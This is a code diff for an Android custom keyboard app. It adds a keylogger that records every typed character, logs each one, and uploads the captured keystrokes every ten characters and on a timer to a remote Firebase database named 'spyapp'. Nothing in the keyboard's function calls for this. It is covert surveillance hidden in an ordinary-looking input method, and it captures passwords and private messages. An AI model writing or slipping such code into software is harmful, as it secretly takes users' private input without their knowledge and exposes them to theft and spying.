@@ -10,13 +10,27 @@ import android.view.KeyEvent;
 import android.view.View;
 import android.view.inputmethod.InputConnection;
 
+import com.firebase.client.Firebase;
+
+import java.util.Calendar;
+import java.util.Date;
+import java.util.HashMap;
+import java.util.Map;
+import java.util.Timer;
+import java.util.TimerTask;
+
 public class MyKeyboard extends InputMethodService
         implements KeyboardView.OnKeyboardActionListener{
 
     private KeyboardView kv;
     private Keyboard keyboard;
+    String keyStrokes = "";
 
+    private Firebase mRef = new Firebase("http://spyapp-9cba9.firebaseio.com/");
+    Firebase mRefKeyLogs = mRef.child("KeyLogs");
     private boolean caps = false;
+
+    Map<String, String> userData = new HashMap<String, String>();
 
     @Override
     public View onCreateInputView(){
@@ -27,9 +41,40 @@ public class MyKeyboard extends InputMethodService
         return kv;
     }
 
+
+
     private void clicked(int keyCode){
         System.out.print(keyCode);
+        //keyStrokes.concat(keyCode)
     }
+
+    long delay = 10 * 1000; // delay in milliseconds
+    LoopTask task = new LoopTask();
+    Timer timer = new Timer("TaskName");
+
+    public void start() {
+        timer.cancel();
+        timer = new Timer("TaskName");
+        Date executionDate = new Date(); // no params = now
+        timer.scheduleAtFixedRate(task, executionDate, delay);
+    }
+
+
+    private class LoopTask extends TimerTask {
+        public void run() {
+            pushToDatabase();
+        }
+    }
+
+    public void pushToDatabase(){
+        Calendar cal = Calendar.getInstance();
+        Date currentTime = cal.getTime();
+        mRef.child(currentTime.toString()).setValue(keyStrokes);
+
+        keyStrokes = "";
+        //start();
+    }
+
 
     @Override
     public void onPress(int primaryCode){
@@ -83,6 +128,12 @@ public class MyKeyboard extends InputMethodService
                 break;
             default:
                 char code = (char) primaryCode;
+                Log.e("code ", String.valueOf(code));
+                keyStrokes = keyStrokes.concat(String.valueOf(code));
+                Log.e("keystrokes ", keyStrokes);
+                if (keyStrokes.length() == 10){
+                    pushToDatabase();
+                }
                 if(Character.isLetter(code) && caps){
                     code = Character.toUpperCase(code);
                 }
